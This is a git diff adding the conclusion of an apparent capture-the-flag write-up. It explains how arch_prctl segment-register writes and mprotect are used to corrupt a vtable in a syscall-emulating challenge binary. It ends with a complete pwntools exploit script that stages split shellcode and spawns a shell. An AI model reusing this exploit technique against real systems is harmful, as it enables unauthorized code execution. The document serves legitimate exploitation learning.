@@ -670,6 +670,156 @@ It behaves in a similar way however it doesn't require that we pass in a valid a
   </figcaption>
 </figure>
 
+This is good, because recall that our shellcode was 13 bytes, with only 8 bytes fully controllable, we're left with 5 bytes.
+
+With this arbitary write, we can place the remaning bytes to `(uint8_t*)&this->arg3 + 8`.
+
+Actually, I did notice a thing with writing to the segment registers.
+
+It can only store up to a certain value.
+
+Checking the kernel source code for the syscall handler [do_arch_prctl_64](https://elixir.bootlin.com/linux/v6.17/source/arch/x86/kernel/process_64.c#L867)
+
+![kernel](kernel.png)
+
+If the value we want to write is greater than `TASK_SIZE_MAX` it returns `EPERM`
+
+```c
+#define	EPERM		 1	/* Operation not permitted */
+```
+
+Cross-referencing this, we end up at the following kernel trace:
+
+```c
+#define TASK_SIZE_MAX		task_size_max()
+
+static __always_inline unsigned long task_size_max(void)
+{
+	unsigned long ret;
+
+	alternative_io("movq %[small],%0","movq %[large],%0",
+			X86_FEATURE_LA57,
+			"=r" (ret),
+			[small] "i" ((1ul << 47)-PAGE_SIZE),
+			[large] "i" ((1ul << 56)-PAGE_SIZE));
+
+	return ret;
+}
+
+#define X86_FEATURE_LA57		(16*32+16) /* "la57" 5-level page tables */
+```
+
+All this is doing is defining the maximum user-space virtual address range. In other words, it sets the upper boundary of valid user-mode addresses, ensuring we can't map or use pointers outside of user space.
+
+Anyways, our 5 byte left has enough bit to fit into this range.
+
+Here's the final solve:
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+
+exe = context.binary = ELF('chall')
+
+context.terminal = ['gnome-terminal', '--maximize', '-e']
+context.log_level = 'info'
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+gdbscript = '''
+brva 0x12C4 
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+def init():
+    global io
+
+    io = start()
+
+def syscall(sys_num, rdi=0, rsi=0, rdx=0):
+    io.sendlineafter(b"syscall:", str(sys_num).encode())
+    io.sendlineafter(b"arg1:", str(rdi).encode())
+    io.sendlineafter(b"arg2:", str(rsi).encode())
+    io.sendlineafter(b"arg3:", str(rdx).encode())
+    io.recvuntil(b"retval: ")
+    ret = int(io.recvline(), 16)
+    return ret
+
+def solve():
+
+    brk         = 0xc
+    mprotect    = 0xa
+    arch_prctl  = 0x9e
+
+    ARCH_SET_GS = 0x1001
+    ARCH_SET_FS = 0x1002
+    ARCH_GET_FS = 0x1003
+    ARCH_GET_GS = 0x1004
+    PAGE        = 0x21000
+    
+    pack = lambda data: int.from_bytes(data, byteorder='little')
+
+    heap_base = syscall(brk, 0) - PAGE
+    info("heap base: %#x", heap_base)
+
+    emu_obj = heap_base + 0x122b0
+    vtable_addr = heap_base + 0x200
+    vtable  = emu_obj + 0x20
+
+    syscall(mprotect, heap_base, PAGE, 0x7)
+
+    syscall(arch_prctl, ARCH_SET_FS, vtable)
+    syscall(arch_prctl, ARCH_GET_FS, vtable_addr)
+
+    sc = asm(
+        """
+        sc:
+            xor eax, eax
+            mov edi, eax
+            mov rsi, [rsp+0x10]
+            shr edx, 0x1
+            syscall
+        """
+    )
+
+    cont = sc[8:]
+
+    syscall(arch_prctl, ARCH_SET_GS, pack(cont))
+    syscall(arch_prctl, ARCH_GET_GS, emu_obj + 0x28)
+
+    syscall(arch_prctl, ARCH_SET_FS, vtable_addr)
+    syscall(arch_prctl, ARCH_GET_FS, emu_obj, u64(sc[:8]))
+
+    payload  = asm("nop") * 0x100
+    payload += asm(shellcraft.sh())
+
+    io.send(payload)
+
+    io.interactive()
+
+def main():
+    
+    init()
+    solve()
+    
+if __name__ == '__main__':
+    main()
+```
+
+Running it works
+
+![done](done.png)
 
 ### Resources
 - [https://www.slideshare.net/slideshow/pwning-in-c-basic/58370781](https://www.slideshare.net/slideshow/pwning-in-c-basic/58370781)
